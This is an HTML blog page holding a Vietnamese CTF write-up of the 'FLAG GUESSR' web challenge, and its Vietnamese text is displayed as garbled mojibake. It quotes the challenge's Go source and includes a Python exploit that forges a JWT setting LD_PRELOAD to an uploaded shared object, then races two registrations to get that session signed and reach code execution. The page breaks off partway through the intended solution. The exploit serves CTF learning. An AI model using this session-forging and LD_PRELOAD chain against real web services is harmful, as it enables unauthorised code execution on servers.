               

<!DOCTYPE html>
<html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <link rel="shortcut icon" href='http://localhost:1313/favicon.ico' type="image/x-icon">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    

    <title>FLAG GUESSR - 3HLD</title>

    

    

    
    <meta name="author" content="3HLD" />
    

    
        <meta property="og:title" content="FLAG GUESSR" />
<meta property="og:description" content="L3AK CTF Write up cho b√†i m√¨nh kh√¥ng solve ra trong gi·∫£i
Knowledge : Dynamical link with LD_PRELOAD , Bypass Sessions , Md5 collision
B√†i n√†y c√≥ 2 c√°ch : Unintended v√† intended nh∆∞ng m√¨nh s·∫Ω n√≥i s∆° qua v·ªÅ walkthrough tr∆∞·ªõc nh√©
Walthrough : M·ª•c ti√™u c·ªßa b√†i n√†y l√† l·∫•y ƒë∆∞·ª£c RCE th√¥ng qua m·ªôt ƒë·ªëng chain&hellip;
Trong gi·∫£i th√¨ b√†i n√†y m√¨nh b·ªã k·∫πt v√¨ m·∫Øc m·ªôt c√°i b·∫´y CSRF kh√° ƒë·∫ßn ." />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://localhost:1313/writeups/l3akctf2025/flagguessr/" /><meta property="article:section" content="writeups" />

<meta property="article:modified_time" content="2025-07-14T11:06:58+00:00" />


    

    
        <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="FLAG GUESSR"/>
<meta name="twitter:description" content="L3AK CTF Write up cho b√†i m√¨nh kh√¥ng solve ra trong gi·∫£i
Knowledge : Dynamical link with LD_PRELOAD , Bypass Sessions , Md5 collision
B√†i n√†y c√≥ 2 c√°ch : Unintended v√† intended nh∆∞ng m√¨nh s·∫Ω n√≥i s∆° qua v·ªÅ walkthrough tr∆∞·ªõc nh√©
Walthrough : M·ª•c ti√™u c·ªßa b√†i n√†y l√† l·∫•y ƒë∆∞·ª£c RCE th√¥ng qua m·ªôt ƒë·ªëng chain&hellip;
Trong gi·∫£i th√¨ b√†i n√†y m√¨nh b·ªã k·∫πt v√¨ m·∫Øc m·ªôt c√°i b·∫´y CSRF kh√° ƒë·∫ßn ."/>

    <link rel="stylesheet" href="/style.css" integrity="">



    <link rel="stylesheet" href="/lib/css/prism.css" integrity="">



    
        <script
  id="MathJax-script"
  async
  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"
></script>
<script>
  MathJax = {
    tex: {
      displayMath: [
        ["\\[", "\\]"],
        ["$$", "$$"],
      ], 
      inlineMath: [
        ["\\(", "\\)"],
        ["$", "$"],
      ], 
    },
  };
</script>

    

    
    <script>
        if (!('theme' in localStorage)) {
            localStorage.theme = 'dark';
        }

        if (localStorage.theme === 'dark' || (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
            document.documentElement.setAttribute("data-theme", "dark");
        } else {
            document.documentElement.setAttribute("data-theme", "light");
        }
    </script>
<script defer src="/js/header.js" integrity=""></script>



    <script defer src="/js/zooming.js" integrity=""></script>







    
        

        
        

        
        
            
        

        <script defer src="/js/prism.js" integrity="" data-manual></script>
    



    
    
    
    <script defer src="/js/search-en.js" integrity=""></script>




<link rel="stylesheet" href="http://localhost:1313/user.css">

    

</head>
<body><header>
    <div id="header_left">
        <div id="sidebar_btn">
            <input type="checkbox" id="sidebar_btn_input" class="hidden" />
            <label id="sidebar_btn_label" for="sidebar_btn_input">
                <svg id="menu_icon" width="26px" height="26px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line>
</svg>

</svg>
            </label>
            <label id="sidebar_canvas_overlay_wrapper" for="sidebar_btn_input">
                <div id="sidebar_canvas_overlay"></div>
            </label>
            <div id="sidebar">
                <ul><li>
                            <a href="/">üíª About</a></li><li>
                            <a href="/news/">üì∞ News</a></li><li>
                            <a href="/writeups/">üìë Writeups</a></li></ul>
            </div>
        </div>
    
        <div class="brand">
            <div>
                <a href="/">3HLD</a>
            </div>
        </div>
    </div>

    <div class="toolbox">
        <div id="theme_tool">
            <svg id="dark_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
</svg>

</svg>
            <svg id="light_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
</svg>

</svg>
        </div>

        
            <div id="search_tool">
                <svg id="search_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line>
</svg>

</svg><div id="search_menu_wrapper" class="hidden">
    <div id="search_menu">
        <div id="search_menu_toolbar">
            <div id="search_menu_input_wrapper">
                <input id="search_menu_input" type="text" placeholder='Search Posts'>
            </div>
            <div id="search_menu_close_btn">
                <svg width="18px" height="18px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line>
</svg>

</svg>
            </div>
        </div>
        <div id="search_menu_results">
        </div>
    </div>
</div>
</div>
        

        
    </div>
</header>
<nav id="navbar" class="pure-menu">
    <ul class="pure-menu-list"><li class="navbar-item pure-menu-item ">
                    
                        <a href="/" class="pure-menu-link">üíª About</a>
                    
                </li><li class="navbar-item pure-menu-item ">
                    
                        <a href="/news/" class="pure-menu-link">üì∞ News</a>
                    
                </li><li class="navbar-item pure-menu-item insection">
                    
                        <a href="/writeups/" class="pure-menu-link">üìë Writeups</a>
                    
                </li></ul>
</nav>
<main>
      <div id="content" class="content-margin">
        
    
    <details class="collapsible-menu-wrapper"><summary class="collapsible-menu-type"><span>Table of contents</span></summary><div class="collapsible-menu">
        
            <nav id="TableOfContents">
  <ul>
    <li><a href="#walthrough-">Walthrough :</a></li>
  </ul>

  <ul>
    <li>
      <ul>
        <li><a href="#forge-jwt-key">Forge JWT KEY</a></li>
      </ul>
    </li>
    <li><a href="#bypass-checkusername">Bypass checkUsername</a></li>
    <li><a href="#intend">Intend</a></li>
    <li><a href="#new-knowledge">New knowledge</a></li>
    <li><a href="#r√∫t-kinh-nghi·ªám-">R√∫t kinh nghi·ªám :</a></li>
  </ul>
</nav>
        
    </div></details>



<div class="tags">
  
    <div class="badge">web</div>

  
    <div class="badge">499 points</div>

  
    <div class="badge">6 solves</div>

  
    <div class="badge">downgrade</div>

  
</div>

<div>
  <p class="date">
    Last edit: Jan 1, 1
  </p>
</div>


    <div class="content-margin">



<article >
    
    
        
        
    
    
<h1 id="l3ak-ctf" class="header-anchor-wrapper">L3AK CTF
  <a href="#l3ak-ctf" class="header-anchor-link">
    <svg width="16px" height="16px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
</svg>

</svg>
  </a>
</h1>

<p><strong>Write up cho b√†i m√¨nh kh√¥ng solve ra trong gi·∫£i</strong></p>
<p><strong>Knowledge : Dynamical link with LD_PRELOAD , Bypass Sessions , Md5 collision</strong></p>
<p>B√†i n√†y c√≥ 2 c√°ch :  Unintended v√† intended nh∆∞ng m√¨nh s·∫Ω n√≥i s∆° qua v·ªÅ walkthrough tr∆∞·ªõc nh√©</p>

<h2 id="walthrough-" class="header-anchor-wrapper">Walthrough :
  <a href="#walthrough-" class="header-anchor-link">
    <svg width="16px" height="16px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
</svg>

</svg>
  </a>
</h2>

<p>M·ª•c ti√™u c·ªßa b√†i n√†y l√† l·∫•y ƒë∆∞·ª£c RCE th√¥ng qua m·ªôt ƒë·ªëng chain&hellip;</p>
<p>Trong gi·∫£i th√¨ b√†i n√†y m√¨nh b·ªã k·∫πt v√¨ m·∫Øc m·ªôt c√°i b·∫´y CSRF kh√° ƒë·∫ßn .
M√¨nh th·∫•y bug csrf r√≤i t√¨m c√°ch l√†m ƒë·ªß th·ª© nh∆∞ng h·∫ßu nh∆∞ ch·∫£ c√≥ t√°c d·ª•ng g√¨ v√† m√¨nh bi·∫øt th·∫•y m·ªçi attack vector mu·ªën ho·∫°t ƒë·ªông ƒë∆∞·ª£c th√¨ ƒë·ªÅu c·∫ßn forge ƒë∆∞·ª£c session nh∆∞ng v√¨ ƒë·ªÉ forge ƒë∆∞·ª£c qu√° kh√≥ n√™n h·∫ßu nh∆∞ m√¨nh b√≠ ng·∫≠m ng√πi&hellip;</p>

<h1 id="ƒë·ªçc-write-up" class="header-anchor-wrapper">ƒê·ªçc write up
  <a href="#%c4%91%e1%bb%8dc-write-up" class="header-anchor-link">
    <svg width="16px" height="16px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
</svg>

</svg>
  </a>
</h1>

<p>C√°ch unintended c√≥ v·∫ª d·ªÖ hi·ªÉu h∆°n n√™n ta s·∫Ω b·∫Øt ƒë·∫ßu  v·ªõi n√≥ .
Idea ch√≠nh ƒë·ªÉ l√™n ƒë∆∞·ª£c RCE l√† set ƒë∆∞·ª£c bi·∫øn m√¥i tr∆∞·ªùng  :</p>
<pre  class="mc-prism hide language-text" ><code class="language-sh">     LD_PRELOAD =./route/to/my/flag.txt
</code></pre>
<p>ƒê√¢y l√† c√°ch duy nh·∫•t ƒë·ªÉ ta c√≥ th·ªÉ l·∫•y RCE nh∆∞ng m√¨nh kh√¥ng bi·∫øt c√°i n√†y n√™n c≈©ng b√≠ t·ª´ ƒë·∫ßu r√≤i &hellip;
Ok v·∫≠y l√†m sao ƒë·ªÉ attack ƒë∆∞·ª£c v√†o bi·∫øn m√¥i tr∆∞·ªùng th√¨ trong source ch·ªâ c√≥ m·ªôt ƒëo·∫°n ·∫£nh h∆∞·ªüng ƒë·∫øn ENV thoi</p>
<pre  class="mc-prism hide language-text" ><code class="language-go">	cmd.Env = append(os.Environ(), fmt.Sprintf(&quot;correct_guesses=%d&quot;, u.FlagsFound))
	cmd.Env = append(cmd.Env, fmt.Sprintf(&quot;total_attempts=%d&quot;, u.FlagsChecked))
	// cai nay weird vc dang le ra phai thay chu ta : )
	for k, v := range session.Properties {
		cmd.Env = append(cmd.Env, fmt.Sprintf(&quot;%s=%s&quot;, k, v))
	}
</code></pre>
<p>·ªû ƒë√¢y ta th·∫•y bi·∫øn ENV s·∫Ω ƒë∆∞·ª£c set theo Properties c·ªßa session b·∫±ng v√≤ng for loop ..
ƒê√°ng l·∫Ω ·ªü ƒë√¢y m√¨nh n√™n nh·∫≠n ra ƒëi·ªÅu n√†y s·ªõm h∆°n v√¨ khi ta t·∫°o m·ªôt user b√¨nh th∆∞·ªùng th√¨ <strong>properties</strong> ch·ªâ ch·ª©a ƒë√∫ng duy nh·∫•t m·ªôt key th√¨ t·∫°o v√≤ng for loop ƒë·ªÉ l√†m chi :0 . ƒêi·ªÅu n√†y d·∫´n ƒë·∫øn vi·ªác ta c·∫ßn ph·∫£i t√¨m c√°ch ƒë·ªÉ forge ƒë∆∞·ª£c m·ªôt jwt b·∫•t k√¨ .</p>

<h3 id="forge-jwt-key" class="header-anchor-wrapper">Forge JWT KEY
  <a href="#forge-jwt-key" class="header-anchor-link">
    <svg width="16px" height="16px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
</svg>

</svg>
  </a>
</h3>

<p>Trong gi·∫£i th√¨ m√¨nh nghƒ© ƒë·∫øn c√°ch s·∫Ω leak JWT KEY b·∫±ng c√°ch n√†o ƒë√≥ nh∆∞ng h·∫ßu nh∆∞ kh√¥ng c√≥ c√°ch n√†o c·∫£ v√† m√¨nh b√≠ t√≠p : )</p>
<p>Th√¨ c√°ch unintended s·∫Ω l·ª£i d·ª•ng m·ªôt c√°i bug ·ªü register nh∆∞ sau  :</p>
<pre  class="mc-prism hide language-text" ><code class="language-go">
func Register(w http.ResponseWriter, r *http.Request) {
	session, valid, resp, err := RequestMiddleware(w, r)
	resp.Body = &quot;/register&quot;
	// BUG NOT CHECK VALID ?
	defer resp.respondRedirect()
	if err != nil {
		resp.Body = &quot;/register?e=bad request&quot;
		return
	}
	if valid &amp;&amp; session.LoggedIn {
		resp.Body = &quot;/home&quot;
		return
	}
	// Sign everything we want
	// Defer call when packnick and all trime
	defer session.UpdateSession(w)

	flagFile, _, err := r.FormFile(&quot;flag&quot;)
	if err != nil {
		session.ClearSession()
		resp.Body = &quot;/register?e=bad request&quot;
		return
	}
	username := r.FormValue(&quot;username&quot;)
	password := r.FormValue(&quot;password&quot;)
	displayName := r.FormValue(&quot;display_name&quot;)
	if len(username) == 0 {
		session.ClearSession()
		resp.Body = &quot;/register?e=missing username&quot;
		return
	} else if len(password) == 0 {
		session.ClearSession()
		resp.Body = &quot;/register?e=missing password&quot;
		return
	} else if len(displayName) == 0 {
		session.ClearSession()
		resp.Body = &quot;/register?e=missing display name&quot;
		return
	}
	newUser := &amp;User{
		Username:    strings.ToLower(username),
		DisplayName: displayName,
		Password:    password,
		UserType:    UserKindStandard,
		UserID:      uuid.NewString(),
	}
	// doan nay bi race condition
	available, err := newUser.CheckUsernameAvailable()
	if err != nil {
		session.ClearSession()
		resp.Body = &quot;/register?e=bad request&quot;
		return
	}
	if !available {
		session.ClearSession()
		resp.Body = &quot;/register?e=username taken&quot;
		return
	}
	err = os.MkdirAll(fmt.Sprintf(&quot;./userdata/%s/uploads&quot;, newUser.UserID), 0644)
	if err != nil {
		session.ClearSession()
		resp.Body = &quot;/register?e=internal server error&quot;
		return
	}
	f, err := os.OpenFile(fmt.Sprintf(&quot;./userdata/%s/flag.txt&quot;, newUser.UserID), os.O_WRONLY|os.O_CREATE, 0644)
	if err != nil {
		session.ClearSession()
		resp.Body = &quot;/register?e=internal server error&quot;
		return
	}
	defer f.Close()
	_, err = io.Copy(f, flagFile)
	if err != nil {
		session.ClearSession()
		resp.Body = &quot;/register?e=internal server error&quot;
		return
	}
	// Chi co o day la khong clear session =))
	err = newUser.InsertUser()
	if err != nil {
		resp.Body = &quot;/register?e=bad request&quot;
		return
	}
	session.InitSession(newUser)
	resp.Body = &quot;/home&quot;
}
</code></pre>
<ul>
<li>·ªû ƒë√¢y ta th·∫•y sau khi check session invalid th√¨ ƒë√°ng l·∫Ω ph·∫£i return kh·ªèi h√†m lu√¥n nh∆∞ng ·ªü ƒë√¢y th√¨ check thi·∫øu c√°i ƒë·∫•y. D·∫´n ƒë·∫øn vi·ªác h√†m defer UpdateSession s·∫Ω ƒë∆∞·ª£c g·ªçi v√† <strong>sign</strong> lu√¥n c√°i session cookie c·ªßa m√¨nh v√† ƒë·∫øn ƒëo·∫°n n√†y ƒë√°ng l·∫Ω ta s·∫Ω c√≥ ƒë∆∞·ª£c cookie ƒë√£ ƒë∆∞·ª£c sign nh∆∞ng s·∫Ω b·ªã clear n·∫øu nh∆∞ <strong>session.ClearSession</strong> ƒë∆∞·ª£c g·ªçi.</li>
<li>ƒê·ªçc ti·∫øp ta s·∫Ω th·∫•y ch·ªâ duy nh·∫•t m·ªôt case Session kh√¥ng b·ªã clear l√† ƒëo·∫°n newUser.InsertUser() . ƒê·ªÉ h√†m n√†y b·ªã error th√¨ ta ch·ªâ c·∫ßn t·∫°o 2 user gi·ªëng username v√† display_name l√† ƒë∆∞·ª£c v√¨ trong config c·ªßa db :</li>
</ul>
<pre  class="mc-prism hide language-text" ><code class="language-go">`CREATE TABLE users (user_id text UNIQUE, username text COLLATE NOCASE, password text, display_name text, description text NULL, user_type integer, cheater integer, PRIMARY KEY (username, display_name));`
</code></pre>
<ul>
<li>Ta th·∫•y PRIMARY KEY ·ªü ƒë√¢y g·ªìm c·∫£ (username,display_name) t·ª©c l√† m·ªôt c·∫∑p n√†y ph·∫£i l√† unique.</li>
<li>V·∫≠y ƒë·∫øn ƒë√¢y ta ch·ªâ c·∫ßn t·∫°o 2 user gi·ªëng nhau ? Kh√¥ng , ·ªü tr√™n c√≥ m·ªôt ƒëo·∫°n checkUsernameAvaiable n·ªØa.</li>
</ul>

<h2 id="bypass-checkusername" class="header-anchor-wrapper">Bypass checkUsername
  <a href="#bypass-checkusername" class="header-anchor-link">
    <svg width="16px" height="16px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
</svg>

</svg>
  </a>
</h2>

<ul>
<li>ƒê·ªÉ qua ƒë∆∞·ª£c h√†m n√†y th√¨ ta c√≥ th·ªÉ ƒë·ªÉ √Ω ƒë·∫øn c√°i case ƒë∆∞·ª£c ch·ªâ ƒë·ªãnh cho username trong config l√† <strong>COLLATE NOCASE</strong> v√† nghƒ© ƒë·∫øn vi·ªác try·ªÅn 2 username kh√°c case nhau nh∆∞ng ƒë√£ b·ªã block b·ªüi toLowerCase() .</li>
<li>ƒê·ªÉ bypass ƒëo·∫°n n√†y th√¨ ta c√≥ 2 c√°ch d·∫´n ƒë·∫øn 2 solution kh√°c nhau :</li>
</ul>
<ol>
<li>Race condition</li>
<li>Leak display_name</li>
</ol>
<p>M√¨nh s·∫Ω gi·∫£i th√≠ch c√°ch 2 sau. C√°ch 1 th√¨ race condition th√¨ ƒë·∫•y , race th√¥i&hellip;.</p>
<p>Script c·ªßa m√¨nh nh∆∞ sau  :</p>
<pre  class="mc-prism hide language-text" ><code class="language-python">import requests
import threading

import jwt


JWT_KEY =&quot;FUCK&quot;
FLAG_SO_ID  = &quot;&quot;
MALICOUS_SESSION  =&quot;&quot;


url =  &quot;http://localhost:5555&quot;

url = &quot;http://34.59.119.124:17005&quot;
def register(username, password):   
    s=  requests.Session()
    data = {
        &quot;username&quot;: username,
        &quot;password&quot;: password,
        &quot;display_name&quot;: &quot;1337&quot;,
    }
    payload = {&quot;username&quot;:&quot;sa&quot;,&quot;user_id&quot;:FLAG_SO_ID,&quot;display_name&quot;:&quot;1337&quot;,&quot;user_kind&quot;:0,&quot;flags_checked&quot;:0,&quot;flags_found&quot;:0,
            &quot;properties&quot; : {
            &quot;description&quot; : &quot;FUCk&quot; ,
            &quot;LD_PRELOAD&quot; :  f&quot;/app/userdata/{FLAG_SO_ID}/flag.txt&quot;,
    },&quot;logged_in&quot; :True}

    token = jwt.encode(payload, JWT_KEY, algorithm=&quot;HS256&quot;)
    with open(&quot;flag.so&quot;, &quot;rb&quot;) as flag_file:
        files = {&quot;flag&quot;: flag_file}
        cookies = {&quot;session&quot;: token}
        response = requests.post(f&quot;{url}/register&quot;,data=data, files=files, cookies=cookies, allow_redirects=False)
        print(response.cookies)
        return response

def login(username, password):
    s = requests.Session()
    data = {
        &quot;username&quot;: username,
        &quot;password&quot;: password,
    }
    response = s.post(f&quot;{url}/login&quot;, data=data,allow_redirects=False)
    print(response.cookies)
    return s



def getProfile(session):
    res = session.get(url+'/api/profile',allow_redirects=False)
    print(res.text)
    return res.json()['user_id']


username = &quot;sa&quot;
password =  &quot;s&quot;
register(username,password)
s=  login(username,password)
FLAG_SO_ID = getProfile(s)
print(f&quot;FLAG_SO_ID: {FLAG_SO_ID}&quot;)

## Start RACE CONDITION TO BYPASS CHECKUSERNAME AND REACH THE INSERT  ###J
username=&quot;aaaa&quot;
password =&quot;s&quot;

t1 = threading.Thread(target=register, args=(username, password))
t2 = threading.Thread(target=register, args=(username, password))

t1.start()
t2.start()
t1.join()
t2.join()

</code></pre>
<p><strong>Flow :</strong></p>
<ol>
<li>Upload So File</li>
<li>Forge session with race conditon</li>
<li>Make ceritficate with forged session</li>
</ol>

<h2 id="intend" class="header-anchor-wrapper">Intend
  <a href="#intend" class="header-anchor-link">
    <svg width="16px" height="16px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
</svg>

</svg>
  </a>
</h2>

<p>Leak display_name .
B·ªüi v√¨ username admin lu√¥n ƒë∆∞·ª£c t·∫°o v·ªõi Admin-* n√™n case c·ªßa ta s·∫Ω kh√¥ng bao gi·ªù b·ªã catch :&gt; . V·∫≠y v·∫•n ƒë·ªÅ ƒë·ªÉ trigger bug th√¨ ph·∫£i insert ƒë√∫ng ch√≠nh x√°c display_name .
ƒê·∫øn ƒë√¢y th√¨ m√¨nh c√≥ nghƒ© ƒë·∫øn c√°ch CSRF v√¨ c√≥ bug CSRF :) nma ko c√≥ effect v√¨ c√≥ cors :( :sadge</p>
<ul>
<li>
<p>V·∫≠y th·ª© ta c·∫ßn ·ªü ƒë√¢y l√† XSS. Ch·ªó n√†o c√≥ xss nh·ªâ ? Check tr√™n c√°c page html th√¨ ta kh√¥ng h·ªÅ th·∫•y s·ª± xu·∫•t hi·ªán c·ªßa innerHTML n√™n ta c√≥ th·ªÉ lo·∫°i b·ªè tr∆∞·ªùng h·ª£p n√†y.</p>
</li>
<li>
<p>Nh∆∞ng server c√≥ th·ªÉ tr·∫£ v·ªÅ response theo 2 c√°ch , 1 trong 2 c√°ch ƒë√≥ l√† tr·∫£ v·ªÅ <strong>RAW RESPONSE</strong></p>
</li>
</ul>
<pre  class="mc-prism hide language-text" ><code class="language-go">
func (r *Response) respondRaw() error {
	if r.Responded {
		return nil
	}
	if r.RespCode == 0 {
		r.RespCode = http.StatusOK
	}
	r.Writer.WriteHeader(r.RespCode)
	respBytes, ok := r.Body.([]byte)
	if !ok {
		return fmt.Errorf(&quot;invalid body&quot;)
	}
	_, err := r.Writer.Write(respBytes)
	r.Responded = true
	return err
}
</code></pre>
<p>Bug n√†y kh√° gi·ªëng v·ªõi MIME SNIFFER c·ªßa chromium khi s·∫Ω auto detect content type d·ª±a tr√™n c√°c 512 bytes ƒë·∫ßu ti√™n c√≥ kh√° nhi·ªÅu c√°ch : <a href="https://chromium.googlesource.com/chromium/src/net/+/master/base/mime_sniffer.cc">https://chromium.googlesource.com/chromium/src/net/+/master/base/mime_sniffer.cc</a>
ƒê∆°n gi·∫£n l√† ch√®n <!DOCTYPE> prefix v√†o ph√≠a tr∆∞·ªõc th√¥i.</p>
<ul>
<li>V·∫≠y h√†m n√†y ƒë∆∞·ª£c s·ª≠ d·ª•ng ·ªü ƒë√¢u ?</li>
</ul>
<pre  class="mc-prism hide language-text" ><code class="language-go">func GetGuess(w http.ResponseWriter, r *http.Request) {
	session, valid, resp, err := RequestMiddleware(w, r)
	defer resp.respond()
	if err != nil {
		return
	}
	if !valid || !session.LoggedIn {
		session.ClearSession()
		session.UpdateSession(w)
		resp.setError(fmt.Errorf(&quot;not logged in&quot;), http.StatusUnauthorized)
		return
	}
	defer session.UpdateSession(w)

	guesserID := r.PathValue(&quot;guesser_id&quot;)
	guessID := r.PathValue(&quot;guess_id&quot;)
	guesser, err := FindUser(guesserID)
	if err != nil {
		resp.setError(fmt.Errorf(&quot;user not found&quot;), http.StatusBadRequest)
		return
	}
	guess, err := guesser.FindGuess(guessID)
	if err != nil {
		resp.setError(fmt.Errorf(&quot;guess not found&quot;), http.StatusBadRequest)
		return
	}
	if session.UserKind != UserKindAdmin &amp;&amp; guess.GuesserID != session.UserID {
		resp.setError(fmt.Errorf(&quot;only admins can see other users' guesses&quot;), http.StatusBadRequest)
		return
	}
	guessPath := guess.GetFilePath()
	guessBytes, err := os.ReadFile(guessPath)
	if err != nil {
		resp.setError(fmt.Errorf(&quot;incorrect guesses not saved&quot;), http.StatusBadRequest)
		return
	}
	resp.Body = guessBytes
	resp.respondRaw()
}
</code></pre>
<p>X√†i duy nh·∫•t ·ªü h√†m n√†y. H√†m n√†y s·∫Ω ƒë·ªçc t·ª´ file ƒë√£ guess c·ªßa user v√† tr·∫£ v·ªÅ response n√™n ta c·∫ßn handle ƒë∆∞·ª£c n·ªôi dung trong file ƒë·∫•y. Ph·∫ßn kh√≥ ch√≠nh l√† h√†m checkFlag kh√° kh√≥ ch·ªãu  :</p>
<pre  class="mc-prism hide language-text" ><code class="language-go">func CheckFlag(w http.ResponseWriter, r *http.Request) {
	session, valid, resp, err := RequestMiddleware(w, r)
	defer resp.respond()
	if err != nil {
		return
	}
	if !valid || !session.LoggedIn {
		session.ClearSession()
		session.UpdateSession(w)
		resp.setError(fmt.Errorf(&quot;not logged in&quot;), http.StatusUnauthorized)
		return
	}
	defer session.UpdateSession(w)

	if r.ContentLength == 0 {
		resp.setError(fmt.Errorf(&quot;missing body&quot;), http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	flagGuess := r.FormValue(&quot;flag&quot;)
	flagHolderID := r.PathValue(&quot;id&quot;)

	u, err := FindUser(flagHolderID)
	if err != nil {
		resp.setError(fmt.Errorf(&quot;user not found&quot;), http.StatusBadRequest)
		return
	}
	if u.UserID == session.UserID {
		resp.setError(fmt.Errorf(&quot;you can't guess your own flag&quot;), http.StatusBadRequest)
		return
	}

	guess := Guess{
		GuessID:      uuid.NewString(),
		GuesserID:    session.UserID,
		FlagHolderID: u.UserID,
		Correct:      false,
	}
	alreadyFound, err := guess.CheckFound()
	if err != nil {
		resp.setError(err, http.StatusBadRequest)
		return
	}
	if alreadyFound {
		resp.setError(fmt.Errorf(&quot;you already found that flag&quot;), http.StatusBadRequest)
		return
	}
	err = guess.InsertGuess()
	if err != nil {
		resp.setError(err, http.StatusBadRequest)
		return
	}

	guessPath := guess.GetFilePath()
	err = os.WriteFile(guessPath, []byte(flagGuess), 0644)
	if err != nil {
		resp.setError(err, http.StatusBadRequest)
		return
	}
	correct, md5, sha := guess.CheckGuess()
	if correct {
		guess.MarkCorrect()
	}
	if !correct {
		os.Remove(guessPath)
	} else {
		os.WriteFile(guessPath, []byte(fmt.Sprintf(&quot;MD5: %s\nSHA256: %s&quot;, md5, sha)), 0644)
	}
	resp.Body = FlagCheckResponse{Correct: correct}
}

</code></pre>
<p>H√†m n√†y s·∫Ω ki·ªÉm tra md5sum c·ªßa 2 file c√≥ b·∫±ng nhau kh√¥ng v√† sha256 c·ªßa 2 file c√≥ b·∫±ng nhau kh√¥ng , n·∫øu kh√¥ng b·∫±ng n√≥ s·∫Ω x√≥a file c√≤n n·∫øu b·∫±ng th√¨ n√≥ s·∫Ω vi·∫øt gi√° tr·ªã c·ªßa MD5 v√† SHA256 v√†o file ?</p>
<ul>
<li>C·∫£ 2 ƒëi·ªÅu ki·ªán tr√™n m√¨nh ƒë·ªÅu th·∫≠t s∆∞ kh√¥ng c·∫ßn &hellip;</li>
